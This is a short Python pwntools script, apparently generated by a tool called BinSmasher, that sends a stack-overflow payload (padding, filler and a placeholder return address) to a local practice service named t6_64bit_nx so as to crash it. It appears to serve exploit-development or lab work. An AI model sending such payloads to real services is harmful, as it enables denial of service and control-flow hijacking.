#!/usr/bin/env python3
# BinSmasher crash script for t6_64bit_nx
from pwn import *
HOST   = "127.0.0.1"
PORT   = 14446
OFFSET = 100
context.arch = "amd64"
context.log_level = "info"
def crash():
    payload  = b"A" * OFFSET
    payload += b"B" * 8
    payload += p64(0xdeadbeefdeadc0de)
    io = remote(HOST, PORT)
    io.sendline(payload)
    try: io.recvall(timeout=2)
    except: pass
    io.close()
    log.success(f"Crash sent ({len(payload)} bytes)")
if __name__ == "__main__":
    crash()
